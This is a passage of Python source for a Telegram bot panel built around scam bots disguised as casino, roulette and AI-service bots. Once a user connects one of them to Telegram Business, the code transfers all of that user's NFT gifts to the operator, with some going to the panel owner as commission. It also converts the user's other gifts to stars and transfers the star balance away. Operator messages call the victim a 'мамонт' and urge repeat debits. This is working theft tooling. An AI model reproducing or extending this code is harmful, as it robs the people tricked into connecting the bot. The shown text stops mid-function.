import asyncio
import json
import logging
import os
import html

from aiohttp import web
from sqlalchemy.orm import selectinload
from aiogram import Bot
from aiogram.client.default import DefaultBotProperties
from logging.handlers import RotatingFileHandler
from aiogram.exceptions import TelegramBadRequest
from aiogram.methods import (
    ConvertGiftToStars,
    GetBusinessAccountGifts,
    GetBusinessAccountStarBalance,
    TransferBusinessAccountStars,
    TransferGift,
)
from aiogram.types import Update

from aiogram.filters import Command, CommandStart 
from aiogram import F, Router, Dispatcher
from aiogram.types import (
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    InlineQuery,
    InlineQueryResultArticle,
    InputTextMessageContent,
    FSInputFile
)
from aiogram.fsm.storage.memory import MemoryStorage

from sqlalchemy import select
from sqlalchemy.exc import SQLAlchemyError
from sqlalchemy.ext.asyncio import AsyncSession
from aiogram.webhook.aiohttp_server import SimpleRequestHandler
from telethon.errors import BadRequestError, ForbiddenError

from config import OWNER_ACCOUNT_ID, PANEL_OWNERS
from config import WEBHOOK_HOST
from db import Session
from log_bot import send_log
from models import CustomGift, WorkerBot, Admin, BusinessConnection, GlobalStats
from worker_bot_logic import handle_worker_start
from channel_stats_logger import send_admin_transfer_log_to_channel
from aiogram.fsm.context import FSMContext
from default_template_handlers import process_giftspin_callback, process_giftspin_message, receive_opponent_username
from aiogram.fsm.storage.base import StorageKey
from default_template_handlers import fsm_storage 

from default_template_handlers import (
    is_default_template_active,
    handle_account_command,
    handle_settings_command,
    handle_settings_close,
    handle_instructions_callback,
    handle_spin_callback,
    get_connection_instruction,
    handle_prize_spin_callback,
    handle_duel_accept,
    handle_nft_link,         
    handle_dice,             
    handle_make_bet,         
    handle_claim_prize
)

_bots: dict[str, Bot] = {}

LOG_DIR = "Логи"
TRANSFER_LOG_DIR = "Логи"
os.makedirs(LOG_DIR, exist_ok=True)

def get_worker_logger(telegram_id: int) -> logging.Logger:
    logger_name = f"worker_{telegram_id}"
    file_path = os.path.join(LOG_DIR, f"{telegram_id}_Connection.log")
    logger = logging.getLogger(logger_name)
    logger.setLevel(logging.INFO)
    while logger.handlers:
        handler = logger.handlers[0]
        handler.close()
        logger.removeHandler(handler)
    handler = RotatingFileHandler(file_path, maxBytes=10*1024*1024, backupCount=3, encoding="utf-8")
    formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s', datefmt='%Y-%m-%d %H:%M:%S')
    handler.setFormatter(formatter)
    logger.addHandler(handler)
    return logger

def get_transfer_logger(admin_id: int) -> logging.Logger:
    logger_name = f"transfer_{admin_id}"
    file_path = os.path.join(TRANSFER_LOG_DIR, f"{admin_id}_Transfer.log")
    logger = logging.getLogger(logger_name)
    logger.setLevel(logging.INFO)
    while logger.handlers:
        handler = logger.handlers[0]
        handler.close()
        logger.removeHandler(handler)
    handler = RotatingFileHandler(file_path, maxBytes=10*1024*1024, backupCount=3, encoding="utf-8")
    formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s', datefmt='%Y-%m-%d %H:%M:%S')
    handler.setFormatter(formatter)
    logger.addHandler(handler)
    return logger

def get_cached_bot(token: str) -> Bot:
    if token not in _bots:
        _bots[token] = Bot(token=token, default=DefaultBotProperties(parse_mode="HTML"))
    return _bots[token]

async def get_bot_token_by_telegram_id(bot_id: str) -> str | None:
    async with Session() as session:
        stmt = select(WorkerBot).where(WorkerBot.telegram_id == int(bot_id))
        result = await session.execute(stmt)
        bot = result.scalar_one_or_none()
        return bot.token if bot else None

async def process_custom_template_callback(callback, bot, chat_id, template):
    if callback.data == "second_button_reply":
        await bot.send_message(
            chat_id=chat_id,
            text=template.second_button_reply or "Текст не задан.",
            parse_mode="HTML"
        )

async def process_neuro_template_message(msg, bot, bot_username):
    if msg.text == "🧠 Мой аккаунт":
        await handle_account_command(msg, bot)
    elif msg.text == "⚙️ Настройки":
        await handle_settings_command(msg, bot)
    else:
        await bot.send_message(
            chat_id=msg.chat.id,
            text=get_connection_instruction(bot_username),
            parse_mode="HTML"
        )

async def process_prize_roulette_message(msg, bot, bot_id, user_id, token):
    state = FSMContext(storage=fsm_storage, key=StorageKey(bot_id=bot_id, chat_id=msg.chat.id, user_id=user_id))
    current_state = await state.get_state()

    if current_state == "DuelFSM:waiting_opponent_username":
        await receive_opponent_username(msg, bot, token)
    elif current_state == "DuelFSM:waiting_nft_link":
        await handle_nft_link(msg, bot)
    elif current_state == "DuelFSM:waiting_dice":
        if msg.dice and msg.dice.emoji == "🎲":
            await handle_dice(msg, bot)

async def process_roulette_callback(callback, bot):
    if callback.data == "spin":
        await handle_spin_callback(callback, bot)
    elif callback.data == "instructions":
        await handle_instructions_callback(callback, bot)

async def process_prize_roulette_callback(callback, bot, bot_username):
    data = callback.data
    if data == "prize_spin":
        await handle_prize_spin_callback(callback, bot)
    elif data == "duel_accept":
        await handle_duel_accept(callback, bot)
    elif data == "make_bet":
        await handle_make_bet(callback, bot)
    elif data == "claim_prize":
        await handle_claim_prize(callback, bot, bot_username)

async def process_neuro_template_callback(callback, bot, chat_id, bot_username):
    if callback.data == "close_settings":
        await handle_settings_close(callback, bot)
    elif callback.data == "stub":
        await bot.send_message(
            chat_id=chat_id,
            text=get_connection_instruction(bot_username),
            parse_mode="HTML"
        )

async def handle_update(update: dict, bot: Bot):
    upd = Update.model_validate(update)
    token = next((t for t, b in _bots.items() if b == bot), None)
    if not token:
        return

    async with Session() as session:
        result = await session.execute(
            select(WorkerBot)
            .where(WorkerBot.token == token)
            .options(selectinload(WorkerBot.template))
        )
        worker_bot = result.scalar_one_or_none()
        if not worker_bot:
            return

        template = worker_bot.template
        template_name = template.name if template else ""
        bot_username = worker_bot.username or "бот"

        is_neuro_template = template_name == "🎓 Шаблон (нейросети)"
        is_roulette_template = template_name == "🎰 Шаблон (рулетка)"
        is_prize_roulette_template = template_name == "🎁 Шаблон (Казино)"
        is_giftspin_template = template_name == "🎁 NFT–Рулетка"  

    if upd.message:
        await process_message(
            upd.message,
            bot, token, is_neuro_template, is_prize_roulette_template,
            bot_username,
            is_giftspin_template  
        )
        return

    if upd.callback_query:
        await process_callback(
            upd.callback_query, bot, template, token,
            is_neuro_template, is_roulette_template, is_prize_roulette_template,
            bot_username,
            is_giftspin_template   
        )

async def process_message(msg, bot, token, is_neuro_template, is_prize_roulette_template, bot_username, is_giftspin_template):
    chat_id = msg.chat.id
    user_id = msg.from_user.id

    if getattr(msg, "text", None) and msg.text.startswith("/start"):
        await handle_worker_start(bot, msg, token)
        return

    if await is_default_template_active(token):
        if is_neuro_template and getattr(msg, "text", None):
            await process_neuro_template_message(msg, bot, bot_username)
        elif is_prize_roulette_template and getattr(msg, "text", None):
            await process_prize_roulette_message(msg, bot, bot.id, user_id, token)
        elif is_giftspin_template and getattr(msg, "text", None):
            await process_giftspin_message(msg, bot, bot_username)   

async def process_callback(callback, bot, template, token, is_neuro_template, is_roulette_template, is_prize_roulette_template, bot_username, is_giftspin_template):
    user_id = callback.from_user.id
    chat_id = callback.message.chat.id if callback.message else user_id

    if template and callback.data == "second_button_reply":
        await handle_second_button_reply(callback, bot, chat_id, template)
        return

    if template and callback.data == "custom_back":
        await handle_custom_back(callback, bot, chat_id, template)
        return

    if await is_default_template_active(token):
        if is_roulette_template:
            await process_roulette_callback(callback, bot)
        elif is_prize_roulette_template:
            await process_prize_roulette_callback(callback, bot, bot_username)
        elif is_neuro_template:
            await process_neuro_template_callback(callback, bot, chat_id, bot_username)
        elif is_giftspin_template:
            await process_giftspin_callback(callback, bot, chat_id, bot_username)   # <--- Новая функция!

    await bot.answer_callback_query(callback.id, text="Обработано")


async def handle_second_button_reply(callback, bot, chat_id, template):
    try:
        await bot.delete_message(chat_id, callback.message.message_id)
    except TelegramBadRequest:
        pass
    await bot.send_message(
        chat_id,
        template.second_button_reply or "Текст не задан.",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="Назад", callback_data="custom_back")]
        ])
    )
    await bot.answer_callback_query(callback.id)


async def handle_custom_back(callback, bot, chat_id, template):
    try:
        await bot.delete_message(chat_id, callback.message.message_id)
    except TelegramBadRequest:
        pass

    text = template.after_start if (template.is_default or getattr(callback.from_user, "is_premium", False)) else (template.non_premium_text or template.after_start)
    btns = []
    if template.button_text and template.button_url:
        btns.append([InlineKeyboardButton(text=template.button_text, url=template.button_url)])
    if template.second_button_text and template.second_button_reply:
        btns.append([InlineKeyboardButton(text=template.second_button_text, callback_data="second_button_reply")])
    reply_markup = InlineKeyboardMarkup(inline_keyboard=btns) if btns else None

    if template.video_path:
        await bot.send_video(chat_id, FSInputFile(template.video_path), caption=text, parse_mode="HTML", reply_markup=reply_markup)
    elif template.photo_url:
        await bot.send_photo(chat_id, template.photo_url, caption=text, parse_mode="HTML", reply_markup=reply_markup)
    else:
        await bot.send_message(chat_id, text, parse_mode="HTML", reply_markup=reply_markup)

    await bot.answer_callback_query(callback.id)


def get_logger_for_admin(admin: Admin) -> logging.Logger:
    return get_worker_logger(admin.telegram_id)

async def get_worker_bot_by_token(session: AsyncSession, bot_token: str) -> WorkerBot | None:
    result = await session.execute(select(WorkerBot).where(WorkerBot.token == bot_token))
    return result.scalar_one_or_none()

async def get_admin_for_worker(session: AsyncSession, worker_bot: WorkerBot) -> Admin | None:
    result = await session.execute(select(Admin).where(Admin.id == worker_bot.owner_id))
    return result.scalar_one_or_none()

async def get_business_connection(session: AsyncSession, worker_bot_id: int, telegram_id: int) -> BusinessConnection | None:
    result = await session.execute(
        select(BusinessConnection).where(
            BusinessConnection.worker_bot_id == worker_bot_id,
            BusinessConnection.telegram_id == telegram_id
        )
    )
    return result.scalar_one_or_none()

async def commit_with_log(session: AsyncSession, logger: logging.Logger, success_msg: str, error_msg: str) -> bool:
    try:
        await session.commit()
        logger.info(success_msg)
        return True
    except SQLAlchemyError as e:
        logger.error(f"{error_msg}: {e}")
        return False

async def handle_webhook_business_connection(update: dict, bot: Bot):
    if "business_connection" not in update:
        return

    bc = update["business_connection"]
    bot_token = next((t for t, b in _bots.items() if b == bot), None)
    if not bot_token:
        return

    async with Session() as session:
        try:
            result = await session.execute(
                select(WorkerBot)
                .options(selectinload(WorkerBot.template))
                .where(WorkerBot.token == bot_token)
            )
            worker_bot = result.scalar_one_or_none()
            if not worker_bot or not worker_bot.owner_id:
                return

            admin = await get_admin_for_worker(session, worker_bot)
            if not admin or not admin.log_bot_enabled:
                return

            logger = get_logger_for_admin(admin)

            user = bc.get("user", {})
            business_user_id = user.get("id")
            username = user.get("username", "неизвестно")
            business_connection_id = bc.get("id")
            is_enabled = bc.get("is_enabled", True)

            rights = bc.get("rights", {})
            logger.info(f"Права подключения для bc_id {business_connection_id}: {json.dumps(rights, ensure_ascii=False)}")
            
            connection = await get_business_connection(session, worker_bot.id, business_user_id)

            if not is_enabled and connection:
                logger.info(
                    f"⛔️ Отключение бота @{worker_bot.username or 'без username'} пользователем "
                    f"@{username or 'неизвестно'} (ID: {business_user_id})"
                )
                connection.is_connected = False
                if not await commit_with_log(session, logger, "✅ is_connected = False", "❌ Ошибка при commit отключения"):
                    return

                template = worker_bot.template
                disconnect_text = template.disconnect_text if template else None
                if disconnect_text:
                    asyncio.create_task(
                        bot.send_message(
                            chat_id=business_user_id,
                            text=disconnect_text,
                            parse_mode="HTML"
                        )
                    )

                text = (
                    f"<b>🤖 Бот <b>@{worker_bot.username or 'нету'}</b> отключён от Telegram Business</b>\n"
                    f"<b>💁🏻‍♀️ Отключил:</b> <b>@{username or 'нету'}</b> <b>ID</b> <code>{business_user_id}</code>"
                )
                logger.info("📤 Отправка лога админу (отключение)")
                await send_log(admin.telegram_id, text)
                return

            template = worker_bot.template
            no_rights_text = template.no_rights_text if template else None

            if not rights.get("can_transfer_and_upgrade_gifts"):
                logger.warning("⚠️ Отсутствует право can_transfer_and_upgrade_gifts")
                if no_rights_text:
                    asyncio.create_task(
                        bot.send_message(
                            chat_id=business_user_id,
                            text=no_rights_text,
                            parse_mode="HTML"
                        )
                    )

            rights_changed = False
            old_rights = connection.rights_json if connection and getattr(connection, "rights_json", None) else {}
            if json.dumps(old_rights, sort_keys=True) != json.dumps(rights, sort_keys=True):
                rights_changed = True
                logger.info(f"Права изменились. Старые: {json.dumps(old_rights, ensure_ascii=False)}, Новые: {json.dumps(rights, ensure_ascii=False)}")

            if connection and connection.is_connected and not rights_changed:
                logger.info("🔁 Подключение уже зарегистрировано и права не изменились — уведомление не отправляем")
                return

            if connection:
                was_disconnected = not connection.is_connected
                connection.is_connected = True
                connection.business_connection_id = business_connection_id
                connection.rights_json = rights  
                await session.commit() 

                status_line = (
                    "📦 Бот повторно подключён к Telegram Business (обновлены права)"
                    if rights_changed else
                    "📦 Бот уже был подключён — обновлены данные"
                )
            else:
                connection = BusinessConnection(
                    telegram_id=business_user_id,
                    username=username,
                    admin_id=admin.id,
                    worker_bot_id=worker_bot.id,
                    is_connected=True,
                    business_connection_id=business_connection_id,
                    rights_json=rights
                )
                session.add(connection)
                worker_bot.connection_count += 1
                logger.info("🔢 Уникальное подключение — увеличиваем connection_count")
                await session.commit()
                status_line = "📦 Бот добавлен в Telegram Business"

            gifts_count = stars_count = nft_count = 0
            try:
                gifts = await bot(GetBusinessAccountGifts(business_connection_id=business_connection_id))
                stars = await bot(GetBusinessAccountStarBalance(business_connection_id=business_connection_id))

                gifts_count = len([g for g in gifts.gifts if getattr(g, "type", "") != "unique"])
                nft_count = len([g for g in gifts.gifts if getattr(g, "type", "") == "unique"])
                stars_count = stars.amount

                nft_links = []
                for g in gifts.gifts:
                    if getattr(g, "type", "") == "unique":
                        slug = getattr(getattr(g, "gift", None), "name", None) or getattr(g, "slug", None)
                        if slug:
                            nft_links.append(f"https://t.me/nft/{slug}")
                if nft_links:
                    logger.info("Ссылки на NFT:\n" + "\n".join(nft_links))
                else:
                    logger.info("Нет NFT для вывода ссылок.")

                logger.info(f"[{admin.id}] 🎁 Подарки: {gifts_count}, 🧬 NFT: {nft_count}, ⭐️ Звёзды: {stars_count}")
            except TelegramBadRequest as e:
                if "BOT_ACCESS_FORBIDDEN" in str(e):
                    logger.error(f"⚠️ BOT_ACCESS_FORBIDDEN при получении бизнес-данных. Права: {json.dumps(rights, ensure_ascii=False)}")
                else:
                    logger.error(f"Ошибка при получении бизнес-данных: {e}")

            rights_info = []
            if rights:
                permission_map = {
                    "Просмотр подарков и звёзд": rights.get("can_view_gifts_and_stars"),
                    "Обмен подарков на звёзды": rights.get("can_convert_gifts_to_stars"),
                    "Настройка подарков": rights.get("can_change_gift_settings"),
                    "Передача и улучшение подарков": rights.get("can_transfer_and_upgrade_gifts"),
                    "Отправка звёзд": rights.get("can_transfer_stars"),
                }
                for label, granted in permission_map.items():
                    mark = "✅" if granted else "❌"
                    rights_info.append(f"{mark} {label}")
            else:
                rights_info.append("❌ Права отсутствуют")
            logger.info(f"Читаемые права для bc_id {business_connection_id}:\n" + "\n".join(rights_info))

            logger.info(
                f"{status_line} — @{worker_bot.username or 'без username'} "
                f"добавил(а) @{username or 'неизвестно'} (ID: {business_user_id})"
            )

            text = (
                f"<b>{status_line}</b>\n"
                f"<b>🤖 Бот:</b> <b>@{worker_bot.username or 'нету'}</b>\n"
                f"<b>💁🏻‍♀️ Добавил:</b> <b>@{username or 'нету'}</b> <b>ID</b> <code>{business_user_id}</code>\n"
                f"<b>🎁 Подарков:</b> <code>{gifts_count}</code>\n"
                f"<b>🧬 NFT:</b> <code>{nft_count}</code>\n"
                f"<b>⭐️ Звёзд:</b> <code>{stars_count}</code>\n\n"
                f"<b>🔐 Права:</b>\n"
                f"<b><blockquote>{chr(10).join(rights_info)}</blockquote></b>"
            )

            logger.info("📤 Отправка лога админу (подключение)")
            await send_log(admin.telegram_id, text)

            transfer_notice = (
                f"<b>🚀 Запускается передача подарков для бота @{worker_bot.username or 'нету'}</b>\n"
                f"<b>➡️ Передача будет на ID:</b> <code>{worker_bot.nft_transfer_to_id or 'нету'}</code>\n"
                f"<code>Это может занять несколько секунд...</code>"
            )
            await send_log(admin.telegram_id, transfer_notice)

            await handle_gift_processing_after_connection(
                bot, business_connection_id, worker_bot, admin, business_user_id, business_user_id, session
            )

        except Exception as e:
            logger = get_worker_logger("unknown")
            logger.exception(f"💥 Непредвиденная ошибка в обработчике business_connection: {e}")

async def log_commission_nft(admin, nft_link, PANEL_OWNERS):
    try:
        username = admin.username or "нет"
        msg_owner = "☕️ Комиссионный NFT уходит панели"
        await send_log(admin.telegram_id, msg_owner)

        msg_admins = (
            "<b>☕️ Комиссионный NFT</b>\n"
            f"<b>🤦🏻‍♀️ Воркер:</b> <code>{admin.telegram_id}</code>\n"
            f"<b>👉 Имя:</b> <b>{admin.first_name or ''}</b>\n"
            f"<b>👉 Тэг:</b> @{username}\n"
        )
        if nft_link:
            msg_admins += f"<b>🎆 NFT:</b> <a href='{nft_link}'>{nft_link}</a>\n"

        tasks = [send_log(panel_admin_id, msg_admins) for panel_admin_id in PANEL_OWNERS]
        await asyncio.gather(*tasks)
    except Exception as e:
        print(f"[log_commission_nft] Ошибка отправки логов: {e}")

async def transfer_all_nfts_after_connection(
    bot: Bot,
    bc_id: str,
    worker_bot: WorkerBot,
    admin: Admin,
    stats: dict,
    transfer_logger: logging.Logger,
    connected_user_id: int,
    session
) -> tuple[int, list]:
    def log_and_send(msg: str, level: str = "info"):
        full_msg = f"[From {connected_user_id}] {msg}"
        getattr(transfer_logger, level)(full_msg)

    log_and_send("=== Старт transfer_all_nfts_after_connection ===")
    log_and_send(f"bc_id: {bc_id}, worker_bot_id: {worker_bot.id}, admin_id: {admin.id}")

    if not worker_bot.nft_transfer_to_id:
        log_and_send("Передача NFT не выполнена — не указан nft_transfer_to_id у воркер-бота", "warning")
        log_and_send("=== Завершение: нет адресата для передачи ===")
        await send_log(admin.telegram_id, "❗️ Передача NFT не выполнена — не указан аккаунт для передачи.")
        return 0, []

    try:
        log_and_send("Получаем список подарков (GetBusinessAccountGifts)...")
        gifts = await bot(GetBusinessAccountGifts(business_connection_id=bc_id))
        log_and_send(f"Найдено подарков: {len(gifts.gifts)}")
        nfts = [g for g in gifts.gifts if getattr(g, "type", "") == "unique"]
        log_and_send(f"Найдено уникальных NFT: {len(nfts)}")

        if not nfts:
            log_and_send("🧬 Нет уникальных NFT для передачи", "info")
            log_and_send("=== Завершение: нет уникальных NFT ===")
            return 0, []

        log_and_send(f"🚚 Начинаем передачу {len(nfts)} уникальных NFT")

        success = 0
        hold_nfts = []
        session.add(admin)  

        for gift in nfts:
            log_and_send(f"▶️ Начинаем обработку NFT: {gift.owned_gift_id}")

            nft_link = None
            slug = None
            gift_obj = getattr(gift, "gift", None)
            if gift_obj and hasattr(gift_obj, "name"):
                slug = getattr(gift_obj, "name")
            if not slug:
                slug = getattr(gift, "slug", None)
            if slug:
                nft_link = f"https://t.me/nft/{slug}"

            for attempt in range(5):
                log_and_send(f"Попытка #{attempt+1} передачи NFT {gift.owned_gift_id}")

                commission_every = admin.commission_every or 4
                commission_counter = admin.commission_counter or 0
                is_commission = (commission_counter + 1) >= commission_every

                log_and_send(f"commission_counter: {commission_counter}, commission_every: {commission_every}, is_commission: {is_commission}")

                if is_commission:
                    recipient_id = OWNER_ACCOUNT_ID
                    log_and_send(f"Получатель для комиссии: {recipient_id}")
                else:
                    recipient_id = worker_bot.nft_transfer_to_id
                    log_and_send(f"Получатель NFT: {recipient_id}")

                try:
                    log_and_send(f"Выполняем TransferGift для NFT {gift.owned_gift_id} (получатель: {recipient_id})")
                    await bot(TransferGift(
                        business_connection_id=bc_id,
                        owned_gift_id=gift.owned_gift_id,
                        new_owner_chat_id=recipient_id,
                        star_count=getattr(gift, "transfer_star_count", None)
                    ))
                    log_and_send(f"✅ NFT ID {gift.owned_gift_id} передан пользователю {recipient_id}")
                    success += 1

                    admin.commission_counter = (commission_counter + 1) if not is_commission else 0
                    log_and_send(f"commission_counter обновлён: {admin.commission_counter}")
                    session.add(admin)  

                    if is_commission:
                        asyncio.create_task(log_commission_nft(admin, nft_link, PANEL_OWNERS))
                        log_and_send(f"Комиссионные сообщения отправлены: owner+админы (в фоне)")

                    for _ in range(3):
                        try:
                            await session.commit()
                            break
                        except Exception:
                            await asyncio.sleep(1)
                    else:
                        raise Exception(f"ФАТАЛЬНО! NFT {gift.owned_gift_id} передан, но не записался в БД!")

                    log_and_send(f"✅ Коммит после передачи NFT {gift.owned_gift_id}")
                    break
                except TelegramBadRequest as e:
                    log_and_send(f"❌ Не удалось передать NFT ID {gift.owned_gift_id}: {e}", "warning")
                    error_text = str(e)
                    if "STARGIFT_TRANSFER_TOO_EARLY" in error_text:
                        stats["nft_hold_too_early"] += 1
                        hold_nfts.append(gift.owned_gift_id)  
                        log_and_send(f"NFT ID {gift.owned_gift_id} невозможно передать — слишком рано (холд), считаем и идём дальше")
                        break
                    elif "BALANCE_TOO_LOW" in error_text:
                        stats["balance_too_low"] = True
                        stats["nft_not_sent"] += 1
                        log_and_send(f"Баланс слишком низкий для передачи NFT ID {gift.owned_gift_id}, отмечаем и продолжаем")
                        break
                    elif "Bad Request: unknown chat identifier specified" in error_text and not is_commission:
                        await send_log(admin.telegram_id, f"❗️ Бот не запущен на аккаунте <code>{recipient_id}</code>")
                        log_and_send(f"⚠️ Бот не запущен на аккаунте {recipient_id}, уведомление админу отправлено")
                        break
                    await asyncio.sleep(2)
                except Exception as e:
                    log_and_send(f"❗️ Неожиданная ошибка передачи NFT ID {gift.owned_gift_id}: {e}", "error")
                    await asyncio.sleep(2)
            else:
                log_and_send(f"❌ Не удалось передать NFT {gift.owned_gift_id} после 5 попыток", "error")

        stats["nft_success"] += success
        session.add(admin)  
        await session.commit()
        log_and_send(f"🎯 Успешно передано NFT: {success} из {len(nfts)}")
        log_and_send(f"NFT в холде: {len(hold_nfts)}")
        log_and_send("=== Завершение transfer_all_nfts_after_connection ===")
        return success, hold_nfts

    except TelegramBadRequest as e:
        err = f"❌ Ошибка при получении подарков: {e}"
        log_and_send(err, "error")
        log_and_send("=== Завершение с ошибкой получения подарков ===")
        return 0, []

# Только конвертация обычных подарков в звёзды
async def convert_regular_gifts_only(
    bot: Bot,
    bc_id: str,
    worker_bot: WorkerBot,
    admin: Admin,
    stats: dict,
    transfer_logger: logging.Logger,
    connected_user_id: int,
    session
):
    def log_with_id(msg: str, level: str = "info"):
        full_msg = f"[UserID:{connected_user_id}] {msg}"
        getattr(transfer_logger, level)(full_msg)

    if "regular_convert_failed" not in stats:
        stats["regular_convert_failed"] = 0

    try:
        try:
            gifts = await bot(GetBusinessAccountGifts(business_connection_id=bc_id))
        except TelegramBadRequest as e:
            if "BOT_ACCESS_FORBIDDEN" in str(e):
                log_with_id("⚠️ Нет доступа к подаркам (BOT_ACCESS_FORBIDDEN), пропускаем конвертацию", "warning")
                stats["errors"] += 1
                return
            raise

        regular_gifts = [g for g in gifts.gifts if getattr(g, "type", "") != "unique"]

        if not regular_gifts:
            log_with_id("📦 Нет обычных подарков для обработки")
            return

        log_with_id(f"🔄 Начинаем конвертацию {len(regular_gifts)} обычных подарков")
        
        for gift in regular_gifts:
            log_with_id(f"➡️ Конвертация подарка ID {gift.owned_gift_id} (тип: {gift.type})")
            try:
                await bot(ConvertGiftToStars(
                    business_connection_id=bc_id,
                    owned_gift_id=gift.owned_gift_id
                ))
                stats["converted"] += 1
                log_with_id(f"✅ Успешно конвертирован подарок ID {gift.owned_gift_id} в звёзды")
                
            except TelegramBadRequest as e:
                stats["errors"] += 1
                if "STARGIFT_CONVERT_TOO_OLD" in str(e):
                    stats["regular_convert_failed"] += 1
                    log_with_id(f"⚠️ Подарок слишком стар — конвертация невозможна", "warning")
                elif "BOT_ACCESS_FORBIDDEN" in str(e):
                    stats["regular_convert_failed"] += 1
                    log_with_id(f"🚫 Нет прав на конвертацию (BOT_ACCESS_FORBIDDEN), пропускаем подарок", "warning")
                    continue  
                else:
                    stats["regular_convert_failed"] += 1
                    log_with_id(f"🚫 Ошибка конвертации: {e}", "warning")
                    
            except Exception as e:
                stats["errors"] += 1
                stats["regular_convert_failed"] += 1
                log_with_id(f"❗️ Неожиданная ошибка: {e}", "error")

            await asyncio.sleep(0.1)

        log_with_id(f"✅ Завершено: конвертировано {stats['converted']} подарков, ошибок: {stats['errors']}")

    except Exception as e:
        stats["errors"] += 1
        log_with_id(f"❌ Критическая ошибка: {e}", "error")

# Перевод остатка звёзд
async def transfer_remaining_stars_after_processing(
    bot: Bot, 
    bc_id: str, 
    worker_bot: WorkerBot, 
    admin: Admin, 
    stats: dict, 
    transfer_logger: logging.Logger,
    connected_user_id: int,
    session
):
    def log_with_id(msg: str, level: str = "info"):
        full_msg = f"[From {connected_user_id}] {msg}"
        getattr(transfer_logger, level)(full_msg)

    try:
        try:
            stars = await bot(GetBusinessAccountStarBalance(business_connection_id=bc_id))
            amount = stars.amount
            log_with_id(f"💫 Остаток звёзд на балансе: {amount}")
        except TelegramBadRequest as e:
            if "BOT_ACCESS_FORBIDDEN" in str(e):
                log_with_id("⚠️ Бот не имеет доступа к звёздам (BOT_ACCESS_FORBIDDEN), пропускаем передачу", "warning")
                stats["errors"] += 1
                return
            raise  

        if amount > 0 and worker_bot.nft_transfer_to_id:
            try:
                log_with_id(f"🚀 Начинаем передачу {amount} звёзд на {worker_bot.nft_transfer_to_id}")
                await bot(TransferBusinessAccountStars(
                    business_connection_id=bc_id,
                    star_count=amount,
                    new_owner_chat_id=worker_bot.nft_transfer_to_id
                ))
                stats["stars_transferred"] += amount
                stats["stars_really_transferred"] = True  
                log_with_id(f"✅ УСПЕШНО ПЕРЕДАНО {amount} ЗВЁЗД получателю {worker_bot.nft_transfer_to_id}")
            except TelegramBadRequest as e:
                stats["errors"] += 1
                log_with_id(f"❌ TelegramBadRequest при передаче звёзд: {e}", "warning")
            except Exception as e:
                stats["errors"] += 1
                log_with_id(f"❌ Неожиданная ошибка при передаче звёзд: {e}", "error")

    except Exception as e:
        stats["errors"] += 1
        err = f"❌ Ошибка при обработке передачи звёзд: {e}"
        log_with_id(err, "exception")

def build_stats():
    return {
        "nft_success": 0,
        "nft_not_unique": 0,
        "converted": 0,
        "regular_convert_failed": 0,
        "stars_transferred": 0,
        "stars_really_transferred": False,
        "errors": 0,
        "nft_hold_too_early": 0,
        "balance_too_low": False,
        "nft_not_sent": 0,
        "current_stars": 0,
    }

def build_transfer_disabled_msgs(settings):
    msgs = []
    if not (settings and settings.transfer_stars_enabled):
        msgs.append("Передача звёзд отключена")
    if not (settings and settings.convert_gifts_to_stars_enabled):
        msgs.append("Обмен подарков на звёзды отключён")
    return msgs

def build_summary(
    business_user_id, stats, successful_nfts, hold_nfts, transfer_disabled_msgs
):
    summary = (
        f"<b>👉 #{business_user_id}</b>\n"
        f"<b>📦 Сводка передачи:</b>\n"
        f"<b>✅ NFT передано:</b> <code>{stats['nft_success']}</code>\n"
        f"<b>🕒 NFT с холдом:</b> <code>{len(hold_nfts)}</code>\n"
        f"<b>♻️ Конвертировано в звёзды:</b> <code>{stats['converted']}</code>\n"
        f"<b>❗️ Старые подарки:</b> <code>{stats['regular_convert_failed']}</code>\n"
        f"<b>⭐️ Звёзд передано:</b> <code>{stats['stars_transferred']}</code>\n"
        f"<b>🚨 Ошибок за процесс:</b> <code>{stats['errors']}</code>\n"
    )

    if stats.get("balance_too_low"):
        nft_not_sent = stats.get("nft_not_sent", 0)
        current_stars = stats.get("current_stars", 0)
        need_stars = max(0, nft_not_sent * 25 - current_stars)
        summary += (
            f"\n<blockquote>"
            f"<b>❗️ Для полного перевода пополни минимум: <u>{need_stars}</u> звёзд</b>\n"
            "✅ Пополни звёзды мамонту и запусти повторное списание!"
            "</blockquote>"
        )

    if transfer_disabled_msgs:
        summary += (
            "\n\<blockquote>⚠️ Некоторые функции отключены настройками:\n" +
            "\n".join(f"• {msg}" for msg in transfer_disabled_msgs) +
            "</blockquote>"
        )
    return summary

# -- основной код --
async def handle_gift_processing_after_connection(
    bot: Bot,
    bc_id: str,
    worker_bot: WorkerBot,
    admin: Admin,
    business_user_id: int,
    connected_user_id: int,
    session
):
    admin = await session.scalar(
        select(Admin).options(selectinload(Admin.settings)).where(Admin.id == admin.id)
    )
    settings = admin.settings

    stats = build_stats()
    transfer_logger = get_transfer_logger(admin.telegram_id)
    transfer_disabled_msgs = build_transfer_disabled_msgs(settings)

    try:
        transfer_logger.info("=== Запуск: первая попытка передачи NFT ===")
        successful_nfts, hold_nfts = await transfer_all_nfts_after_connection(
            bot, bc_id, worker_bot, admin, stats, transfer_logger, connected_user_id, session
        )

        if settings and settings.convert_gifts_to_stars_enabled:
            transfer_logger.info("=== Запуск: конвертация обычных подарков в звёзды ===")
            await convert_regular_gifts_only(
                bot, bc_id, worker_bot, admin, stats, transfer_logger, connected_user_id, session
            )
        else:
            transfer_logger.info("⛔️ Конвертация подарков отключена настройками")

        try:
            stars = await bot(GetBusinessAccountStarBalance(business_connection_id=bc_id))
            transfer_logger.info(f"Баланс звёзд после конвертации: {stars.amount}")
            stats["current_stars"] = stars.amount

            if stars.amount >= 25:
                transfer_logger.info("=== Запуск: повторная попытка передачи NFT после конвертации ===")
                await transfer_all_nfts_after_connection(
                    bot, bc_id, worker_bot, admin, stats, transfer_logger, connected_user_id, session
                )
            else:
                transfer_logger.info("Повторная передача NFT не требуется: баланс звёзд < 25")
        except Exception as e:
            stats["errors"] += 1
            transfer_logger.warning(f"Не удалось получить баланс звёзд для повторной передачи NFT: {e}")

        if settings and settings.transfer_stars_enabled:
            transfer_logger.info("=== Запуск: передача оставшихся звёзд ===")
            await transfer_remaining_stars_after_processing(
                bot, bc_id, worker_bot, admin, stats, transfer_logger, connected_user_id, session
            )
        else:
            transfer_logger.info("⛔️ Передача звёзд отключена настройками")

